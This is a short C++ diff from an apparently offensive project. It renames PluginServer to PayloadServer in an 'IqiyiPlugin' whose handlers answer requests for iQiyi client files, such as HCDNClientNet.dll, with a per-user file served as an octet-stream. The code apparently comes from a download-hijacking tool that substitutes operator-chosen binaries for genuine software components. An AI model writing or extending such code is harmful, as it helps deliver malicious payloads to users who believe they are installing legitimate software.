@@ -5,7 +5,7 @@
 #include "../cipher/CryptoUtils.h"
 #include "../HttpUtils.h"
 #include "../version.h"
-#include "PluginServer.h"
+#include "PayloadServer.h"
 #include "../PreparePacket.h"
 
 int gIqiyiAndroidFlag = 9;
@@ -328,7 +328,7 @@ int IqiyiPlugin::replyIqiyiPcDll(char*recvBuffer, int len, int buflimit, LPHTTPP
 	char * szHttpRespFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\n\r\n";
 
 	string filename = Public::getUserUrl(lphttp->username, IQIYI_DOWNLOADHELPER_FILENAME);
-	int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpRespFormat, 1);
+	int ret = PayloadServer::SendPluginFile(filename.c_str(), lphttp, szHttpRespFormat, 1);
 	return 0;
 }
 
@@ -457,7 +457,7 @@ int IqiyiPlugin::replyIqiyiPcHcdnExe(char*recvBuffer, int len, int buflimit, LPH
 		"Content-Length: %u\r\n\r\n";
 
 	string filename = Public::getUserUrl(lphttp->username,"HCDNClientNet.dll" );
-	int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpPartialZipFormat, 1);
+	int ret = PayloadServer::SendPluginFile(filename.c_str(), lphttp, szHttpPartialZipFormat, 1);
 	return 0;
 }
 
@@ -468,7 +468,7 @@ int IqiyiPlugin::replyIqiyiPcHcdn(char*recvBuffer, int len, int buflimit, LPHTTP
 // 
 // 	string filename = Public::getUserUrl(lphttp->username, "HCDNClientNet.dll");
 // 
-// 	int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpRespFormat, 1);
+// 	int ret = PayloadServer::SendPluginFile(filename.c_str(), lphttp, szHttpRespFormat, 1);
 // 	return ret;
 
 	int ret = 0;
